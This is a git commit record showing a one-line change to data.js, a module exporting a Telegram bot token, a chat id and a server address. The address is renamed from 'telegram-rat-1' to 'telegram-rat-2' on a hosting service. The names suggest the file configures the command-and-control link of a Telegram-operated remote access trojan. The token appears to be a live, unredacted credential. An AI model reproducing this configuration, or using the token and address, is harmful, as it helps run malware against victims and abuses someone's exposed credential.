669b27d9615350048818f9e0d02c597cf3747397
alpha02v <brokennaruto09@gmail.com>
2025-09-30 13:05:19 +0530

    Update data.js

--- data.js
+++ data.js
@@ -1,5 +1,5 @@
 module.exports = {
   token: "8269491077:AAHX0xw0QX8_6LrziGUGoAr9qvjlv096eAc",
   id:"7100193056",
-  address:"https://telegram-rat-1.onrender.com"
+  address:"https://telegram-rat-2.onrender.com"
 };
